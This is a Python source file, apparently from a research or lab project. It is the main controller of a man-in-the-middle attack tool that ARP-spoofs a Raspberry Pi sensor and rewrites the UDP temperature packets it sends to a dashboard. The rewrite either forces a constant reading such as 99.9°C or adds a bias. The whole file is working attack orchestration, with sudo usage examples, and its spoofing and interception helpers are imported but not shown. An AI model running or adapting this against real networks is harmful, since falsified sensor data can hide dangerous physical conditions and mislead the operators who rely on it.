#!/usr/bin/env python3
"""
ASOA MITM Attack System - Main Controller
Intercepts and modifies UDP temperature packets between SensorModule and Dashboard
"""

import argparse
import signal
import sys
import time
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from network_discovery import NetworkDiscovery
from platform_detector import PlatformDetector
from mitm_macos import MacOSMITM
from mitm_linux import LinuxMITM
from arp_spoof import ARPSpoofer
from utils.logger import setup_logger
from utils.network_utils import get_default_gateway, get_interface_ip

class ASOAMITMAttack:
    def __init__(self, args):
        self.args = args
        self.logger = setup_logger('asoa_mitm', level='INFO')
        self.platform = PlatformDetector()
        self.network_discovery = NetworkDiscovery()
        self.arp_spoofer = None
        self.mitm_engine = None
        self.running = False
        
    def setup(self):
        """Initialize the attack system"""
        self.logger.info("🚀 Initializing ASOA MITM Attack System...")
        
        # Detect platform
        if not self.platform.is_supported():
            self.logger.error(f"❌ Unsupported platform: {self.platform.get_platform()}")
            sys.exit(1)
            
        self.logger.info(f"✅ Platform detected: {self.platform.get_platform()}")
        
        # Discover target
        target_ip = self.args.target_ip
        if not target_ip:
            self.logger.info("🔍 Discovering Raspberry Pi target...")
            target_ip = self.network_discovery.find_raspberry_pi()
            if not target_ip:
                self.logger.error("❌ Could not find Raspberry Pi target automatically")
                self.logger.info("💡 Use --target-ip to specify manually")
                sys.exit(1)
                
        self.logger.info(f"✅ Target found: {target_ip}")
        
        # Get network info
        gateway_ip = get_default_gateway()
        interface_ip = get_interface_ip()
        
        self.logger.info(f"🌐 Network: Gateway={gateway_ip}, Interface={interface_ip}")
        
        # Initialize ARP spoofing
        self.arp_spoofer = ARPSpoofer(
            target_ip=target_ip,
            gateway_ip=gateway_ip,
            interface=self.args.interface
        )
        
        # Initialize MITM engine based on platform
        if self.platform.is_macos():
            self.mitm_engine = MacOSMITM(
                target_ip=target_ip,
                attack_type=self.args.attack,
                target_temp=self.args.target_temp,
                bias=self.args.bias
            )
        else:
            self.mitm_engine = LinuxMITM(
                target_ip=target_ip,
                attack_type=self.args.attack,
                target_temp=self.args.target_temp,
                bias=self.args.bias
            )
            
        self.logger.info("✅ Attack system initialized successfully")
        
    def start_attack(self):
        """Start the MITM attack"""
        self.logger.info("🔥 Starting MITM attack...")
        
        try:
            # Start ARP spoofing
            self.logger.info("📡 Starting ARP spoofing...")
            self.arp_spoofer.start()
            time.sleep(2)  # Allow ARP cache to update
            
            # Start MITM engine
            self.logger.info("🎯 Starting packet interception...")
            self.mitm_engine.start()
            
            self.running = True
            self.logger.info("✅ MITM attack is now active!")
            self.logger.info("📊 Intercepting UDP packets on port 7400...")
            self.logger.info("🛑 Press Ctrl+C to stop attack")
            
            # Keep running until interrupted
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.logger.info("🛑 Received interrupt signal")
        except Exception as e:
            self.logger.error(f"❌ Attack failed: {e}")
        finally:
            self.stop_attack()
            
    def stop_attack(self):
        """Stop the attack and cleanup"""
        self.logger.info("🧹 Stopping attack and cleaning up...")
        
        if self.mitm_engine:
            self.mitm_engine.stop()
            
        if self.arp_spoofer:
            self.arp_spoofer.stop()
            
        self.running = False
        self.logger.info("✅ Attack stopped and cleanup completed")
        
    def signal_handler(self, signum, frame):
        """Handle interrupt signals"""
        self.logger.info(f"📡 Received signal {signum}")
        self.stop_attack()
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="ASOA MITM Attack - Intercept and modify UDP temperature packets",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Constant temperature attack (force 99.9°C)
  sudo python3 main.py --attack constant --target-temp 99.9
  
  # Bias attack (add 10°C to all readings)
  sudo python3 main.py --attack bias --bias 10.0
  
  # Specify target IP manually
  sudo python3 main.py --attack constant --target-ip 192.168.1.100
        """
    )
    
    parser.add_argument(
        '--attack', 
        choices=['constant', 'bias'], 
        required=True,
        help='Type of attack to perform'
    )
    
    parser.add_argument(
        '--target-temp', 
        type=float,
        help='Target temperature for constant attack (e.g., 99.9)'
    )
    
    parser.add_argument(
        '--bias', 
        type=float,
        help='Temperature bias to add for bias attack (e.g., 10.0)'
    )
    
    parser.add_argument(
        '--target-ip',
        help='Target Raspberry Pi IP address (auto-discovered if not specified)'
    )
    
    parser.add_argument(
        '--interface',
        default='en0',
        help='Network interface to use (default: en0)'
    )
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.attack == 'constant' and args.target_temp is None:
        parser.error("--target-temp is required for constant attack")
        
    if args.attack == 'bias' and args.bias is None:
        parser.error("--bias is required for bias attack")
        
    # Check for root privileges
    if not sys.platform.startswith('win'):
        try:
            import os
            if os.geteuid() != 0:
                print("❌ This script requires root privileges (sudo)")
                print("💡 Run with: sudo python3 main.py [options]")
                sys.exit(1)
        except AttributeError:
            pass  # Windows doesn't have geteuid
            
    # Create and run attack
    attack = ASOAMITMAttack(args)
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, attack.signal_handler)
    signal.signal(signal.SIGTERM, attack.signal_handler)
    
    try:
        attack.setup()
        attack.start_attack()
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
